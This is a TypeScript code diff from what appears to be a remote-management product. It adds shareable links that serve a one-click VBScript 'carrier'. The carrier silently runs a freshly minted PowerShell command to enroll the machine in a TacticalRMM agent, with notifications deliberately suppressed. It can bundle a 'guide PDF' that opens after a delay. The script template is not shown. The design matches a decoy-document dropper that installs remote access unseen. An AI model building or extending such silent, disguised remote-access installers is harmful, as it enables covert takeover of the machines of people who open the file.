@@ -100,7 +100,7 @@ export interface InstallLinkHistoryItem {
   installUrl: string;
   installTokenExpiresAt: Date;
   downloadCount: number;
-  installerKind: "zip" | "exe" | null;
+  installerKind: "zip" | "exe" | "vbs" | null;
   installerNames: InstallerNames | null;
   createdAt: Date;
 }
@@ -164,7 +164,7 @@ export async function listInstallLinks(userId: string): Promise<InstallLinkHisto
     installUrl: row.publicUrl,
     installTokenExpiresAt: row.expiresAt,
     downloadCount: typeof row.downloadCount === "number" ? row.downloadCount : 0,
-    installerKind: row.installerKind === "zip" || row.installerKind === "exe" ? row.installerKind : null,
+    installerKind: row.installerKind === "zip" || row.installerKind === "exe" || row.installerKind === "vbs" ? row.installerKind : null,
     installerNames: parseStoredInstallerNames(row.installerNamesJson) ?? null,
     createdAt: row.createdAt,
   }));
@@ -674,6 +674,26 @@ export async function mintInstallLink(
 export async function mintPublicPsCommand(
   userId: string,
 ): Promise<{ command: string; expiresAt: Date }> {
+  const { command, orgId } = await fetchPublicOrgPsCommand(userId);
+  await recordAgentActionAudit({
+    userId,
+    action: "vantra_public_ps_minted",
+    status: "executed",
+    detail: { orgId },
+  });
+  return { command, expiresAt: new Date(Date.now() + 72 * 60 * 60 * 1000) };
+}
+
+/**
+ * The public org's install command (Vantra's additive `as:"powershell"` mint)
+ * WITHOUT an audit row — the shared engine behind `mintPublicPsCommand`, the
+ * VBS file mint, and the TASK_179 VBS link resolve (D5: regenerated at open
+ * time so a delivered carrier never embeds a stored credential). Each caller
+ * records its OWN action, so one user action is exactly one audit row.
+ */
+async function fetchPublicOrgPsCommand(
+  userId: string,
+): Promise<{ command: string; orgId: string }> {
   const link = await db.vantraLink.findUnique({ where: { userId } });
   if (!link || link.status === "revoked") throw new Error("no_link");
 
@@ -687,17 +707,7 @@ export async function mintPublicPsCommand(
   if (typeof minted.command !== "string" || !minted.command) {
     throw new Error("vantra_deploy_outdated");
   }
-
-  await recordAgentActionAudit({
-    userId,
-    action: "vantra_public_ps_minted",
-    status: "executed",
-    detail: { orgId: link.orgId },
-  });
-  return {
-    command: minted.command,
-    expiresAt: new Date(Date.now() + 72 * 60 * 60 * 1000),
-  };
+  return { command: minted.command, orgId: link.orgId };
 }
 
 // ============================================================================
@@ -751,10 +761,17 @@ export function safeVbsFileName(value: unknown): string {
   return finalName;
 }
 
-/** Mint the public tier's one-click `.vbs` carrier for this user's ORG. */
+/**
+ * Mint the public tier's one-click `.vbs` carrier for this user's ORG.
+ * TASK_179 stage 2: an optional guide PDF rides INSIDE the carrier (the
+ * picker added to the VBS card). Same route-validated `InstallerPdf` the zip
+ * accepts; the link's 2 MB row cap does NOT apply here — file-mint bytes are
+ * never stored, so the full 20 MB validator stands (D3).
+ */
 export async function mintPublicVbsFile(
   userId: string,
   requestedName?: string,
+  pdf?: InstallerPdf | null,
 ): Promise<{ fileName: string; content: string; expiresAt: Date }> {
   // Per-ORG by construction: mintPublicPsCommand resolves the user's
   // VantraLink row and Vantra builds the enrollment for THAT org.
@@ -763,7 +780,10 @@ export async function mintPublicVbsFile(
   const flat = normalizePowerShellCommand(minted.command);
   // Stage-1 owner directive: no TacticalRMM GUI / success notification.
   const silent = ensureSilentEnroll(flat);
-  const content = renderCarrierVbs(silent);
+  const content = renderCarrierVbs(
+    silent,
+    pdf ? { pdf: { pdfBase64: pdf.pdf, pdfName: pdf.pdfName, delaySec: pdf.pdfDelaySec } } : {},
+  );
   const fileName = safeVbsFileName(requestedName);
   const link = await db.vantraLink.findUnique({
     where: { userId },
@@ -776,6 +796,166 @@ export async function mintPublicVbsFile(
     detail: { orgId: link?.orgId, fileName },
   });
   return { fileName, content, expiresAt: minted.expiresAt };
+}
+
+// ============================================================================
+// TASK_179 stage 2 — the public tier's shareable `.vbs` LINK.
+//
+// Stage 1 mints the carrier as an inline file (save-to-disk, one click). This
+// adds the SAME carrier as a shareable link on the EXISTING zip link surface
+// (owner: "we maintain the same link we use for the public zip downloads"):
+// the identical `/link/vantra/<token>` wrapper and `VantraInstallLink` history
+// row zip/exe links already use, so it lands in the link-history card with a
+// `vbs` chip (D6) and inherits the 72 h TTL, revoke and download-count
+// semantics for free (Q2: multi-use until expiry, like zip).
+//
+// WHAT IS STORED vs REGENERATED (D5): the row keeps only what cannot be
+// regenerated — the file name and the optional guide PDF (link-attached PDFs
+// cap at 2 MB — D3/Q1's row-bloat bound). The install COMMAND is minted from
+// Vantra at OPEN time (same org mint as the file path, minus its audit — the
+// audit for a link is `vantra_public_vbs_link_minted`, D7), so a delivered
+// file never embeds a stored credential and a rotated org auth is honoured
+// on every open. Regeneration failures propagate to the route (503/502), per
+// D5: never a stale-credential deliverable.
+// ============================================================================
+
+/** 2 MB decoded ceiling for a PDF stored INSIDE a link row (D3; Q1 answer). */
+export const MAX_LINK_PDF_BYTES = 2 * 1024 * 1024;
+
+/** The SERVER-ONLY row payload of a `vbs` history row (`installerPayloadJson`). */
+interface VbsLinkPayload {
+  vbsName?: string;
+  pdfBase64?: string;
+  pdfName?: string;
+  pdfDelaySec?: number;
+}
+
+export interface PublicVbsLinkMint {
+  /** The shareable wrapper link — same `/link/vantra/<token>` shape as zip. */
+  link: string;
+  fileName: string;
+  expiresAt: Date;
+}
+
+/**
+ * Mint the shareable `.vbs` link for this user's ORG.
+ *
+ * `pdf` is the route-validated InstallerPdf; the 2 MB row cap is re-checked
+ * here too (defense in depth: the route enforces it as a 413, this throws so
+ * a direct lib caller cannot bloat a row either). The org's command
+ * capability is pre-verified at mint (result discarded — D5 regenerates at
+ * open) so a broken org fails HERE, loudly, instead of producing a link that
+ * dies on click.
+ */
+export async function mintPublicVbsLink(
+  userId: string,
+  requestedName?: string,
+  pdf?: InstallerPdf | null,
+): Promise<PublicVbsLinkMint> {
+  const link = await db.vantraLink.findUnique({
+    where: { userId },
+    select: { status: true, orgId: true },
+  });
+  if (!link || link.status === "revoked") throw new Error("no_link");
+
+  let pdfBase64: string | undefined;
+  let pdfName: string | undefined;
+  let pdfDelaySec: number | undefined;
+  if (pdf) {
+    const b64 = pdf.pdf.replace(/^data:[^;]+;base64,/, "").replace(/\s+/g, "");
+    // Same arithmetic as validateInstallerPdf: 4 chars ⇒ 3 bytes, ROUND UP
+    // so the ceiling can never be slipped past.
+    if (Math.ceil((b64.length * 3) / 4) > MAX_LINK_PDF_BYTES) {
+      throw new Error("pdf_too_large");
+    }
+    // Store the DECODED-alphabet form only (compact; the carrier strips the
+    // same decorations again anyway).
+    pdfBase64 = b64;
+    pdfName = pdf.pdfName;
+    pdfDelaySec = pdf.pdfDelaySec;
+  }
+
+  // D5 pre-verify — the org can mint a command at all. Not stored.
+  await fetchPublicOrgPsCommand(userId);
+
+  const token = crypto.randomBytes(24).toString("hex");
+  const expiresAt = new Date(Date.now() + 72 * 60 * 60 * 1000);
+  const publicUrl = `${env.publicLinkBaseUrl}/link/vantra/${token}`;
+  const fileName = safeVbsFileName(requestedName);
+  const payload: VbsLinkPayload = { vbsName: fileName, pdfBase64, pdfName, pdfDelaySec };
+  // The row IS the deliverable here (unlike zip's history row, which is a
+  // side-copy of the already-succeeding pointer mint): if this fails, the
+  // caller must see a 5xx — never a link that 410s on first click.
+  await db.vantraInstallLink.create({
+    data: {
+      userId,
+      tokenHash: sha256(token),
+      publicUrl,
+      expiresAt,
+      installerKind: "vbs",
+      installerPayloadJson: JSON.stringify(payload),
+    },
+  });
+  await recordAgentActionAudit({
+    userId,
+    action: "vantra_public_vbs_link_minted",
+    status: "executed",
+    detail: { orgId: link.orgId, fileName },
+  });
+  return { link: publicUrl, fileName, expiresAt };
+}
+
+export interface VbsLinkArtifact {
+  fileName: string;
+  content: string;
+}
+
+/**
+ * Open a `vbs` history row and render its carrier NOW (D5: fresh org
+ * command). Returns null for anything that must not serve — unknown hash,
+ * wrong kind (zip/exe rows fall through to `resolveInstallToken` on the
+ * route, whose path stays byte-identical), expired, or a revoked owner.
+ * Regeneration errors PROPAGATE — the route maps them (503 for an outdated
+ * Vantra, 502 otherwise) per D5. A corrupt payload degrades to the plain
+ * silent carrier: a missing PDF must never cost somebody the install.
+ */
+export async function resolveVbsInstallToken(token: string): Promise<VbsLinkArtifact | null> {
+  const row = await db.vantraInstallLink
+    .findUnique({ where: { tokenHash: sha256(token) } })
+    .catch(() => null);
+  if (!row || row.installerKind !== "vbs") return null;
+  if (row.expiresAt.getTime() < Date.now()) return null;
+  const owner = await db.vantraLink.findUnique({
+    where: { userId: row.userId },
+    select: { status: true },
+  });
+  if (!owner || owner.status === "revoked") return null;
+
+  let payload: VbsLinkPayload = {};
+  try {
+    payload = row.installerPayloadJson
+      ? (JSON.parse(row.installerPayloadJson) as VbsLinkPayload)
+      : {};
+  } catch {
+    payload = {};
+  }
+
+  const { command } = await fetchPublicOrgPsCommand(row.userId); // D5 — throws on failure
+  const flat = normalizePowerShellCommand(command);
+  const silent = ensureSilentEnroll(flat);
+  const pdf = payload.pdfBase64
+    ? { pdfBase64: payload.pdfBase64, pdfName: payload.pdfName, delaySec: payload.pdfDelaySec }
+    : undefined;
+  const content = renderCarrierVbs(silent, pdf ? { pdf } : {});
+  const fileName = safeVbsFileName(payload.vbsName);
+  // One open = one download, best-effort (zip parity): a count write must
+  // never cost the caller the bytes that were already rendered for them.
+  await db.vantraInstallLink
+    .update({ where: { id: row.id }, data: { downloadCount: { increment: 1 } } })
+    .catch(() => {
+      // best-effort bookkeeping only
+    });
+  return { fileName, content };
 }
 
 /**
